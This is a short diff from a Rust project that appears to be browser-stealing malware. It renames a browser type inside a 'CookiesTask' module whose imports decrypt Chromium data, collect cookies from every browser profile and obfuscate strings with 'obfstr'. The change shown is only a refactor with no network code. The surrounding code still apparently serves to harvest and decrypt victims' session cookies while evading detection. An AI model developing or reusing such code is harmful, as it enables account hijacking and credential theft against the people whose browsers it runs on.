@@ -4,7 +4,7 @@ use crate::alloc::borrow::ToOwned;
 use tasks::{parent_name, Task};
 use utils::browsers::chromium::{decrypt_data};
 use utils::path::Path;
-use crate::chromium::Browser;
+use crate::chromium::BrowserData;
 use crate::{collect_from_all_profiles, read_sqlite3_and_map_records, to_string_and_write_all, Cookie};
 use obfstr::obfstr as s;
 use database::TableRecord;
@@ -16,11 +16,11 @@ const COOKIES_PATH: usize            = 6;
 const COOKIES_EXPIRES_UTC: usize     = 7;
 
 pub(super) struct CookiesTask {
-    browser: Arc<Browser>
+    browser: Arc<BrowserData>
 }
 
 impl CookiesTask {
-    pub(super) fn new(browser: Arc<Browser>) -> Self {
+    pub(super) fn new(browser: Arc<BrowserData>) -> Self {
         Self { browser }
     }
 }
